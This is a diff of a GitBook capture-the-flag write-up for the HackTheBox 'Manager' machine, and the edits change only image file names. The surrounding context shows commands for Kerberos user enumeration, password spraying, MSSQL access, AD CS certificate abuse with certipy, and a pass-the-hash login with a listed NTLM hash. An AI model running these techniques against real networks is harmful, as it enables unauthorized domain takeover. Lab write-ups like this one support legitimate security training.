@@ -4,7 +4,7 @@ icon: windows
 
 # Manager - Medium
 
-<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/manager"><strong>Manager</strong></a></p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/manager"><strong>Manager</strong></a></p></figcaption></figure>
 
 ## <mark style="color:blue;">Gaining Access</mark>
 
@@ -128,7 +128,7 @@ kerbrute userenum ~/tools/SecLists/Usernames/xato-net-10-million-usernames.txt -
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 It finds three usernames: administrator, guest, and operator.&#x20;
 
@@ -144,7 +144,7 @@ I am going to check and see if any usernames I've found use their usernames as a
 netexec smb manager.htb -u users -p users --no-brute --continue-on-success
 ```
 
-<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:$primary;">MSSQL</mark>
 
@@ -152,7 +152,7 @@ netexec smb manager.htb -u users -p users --no-brute --continue-on-success
 netexec mssql manager.htb -u operator -p operator
 ```
 
-<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Operator has access to mssql
 
@@ -162,13 +162,13 @@ impacket-mssqlclient manager.htb/operator:operator@manager.htb -windows-auth
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We do not have acess to <mark style="color:$primary;">**xp\_cmdshell**</mark> but we do to <mark style="color:$primary;">**xp\_dirtree**</mark>
 
 I am going to try and look for credentials on the system
 
-<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 There is a backup of the site in the root directory of the website! I'll download it
 
@@ -248,7 +248,7 @@ certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This fails, but it saves the private key involved. Then, using the Manage CA and Manage Certificates privileges, I’ll use the ca subcommand to issue the request:
 
@@ -268,7 +268,7 @@ certipy-ad ca -ca manager-DC01-CA -target dc01.manager.htb -issue-request 21 -u 
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```shellscript
@@ -276,7 +276,7 @@ certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 21 -u rave
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 If everything goes smoothly, we should receive an **Administrator.pfx** certificate.
 
@@ -289,7 +289,7 @@ service virtualbox-guest-utils stop
 sudo ntpdate 10.10.11.236
 ```
 
-<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 The final step in this attack is extracting the NTLM hash from the **Administrator.pfx** certificate using the following command:
 
@@ -297,7 +297,7 @@ The final step in this attack is extracting the NTLM hash from the **Administrat
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
 ```
 
-<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:$primary;">Pass the Hash Attack</mark>
 
@@ -307,4 +307,4 @@ we can use pass the hash to get a shell as administrator,
 evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
 ```
 
-<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
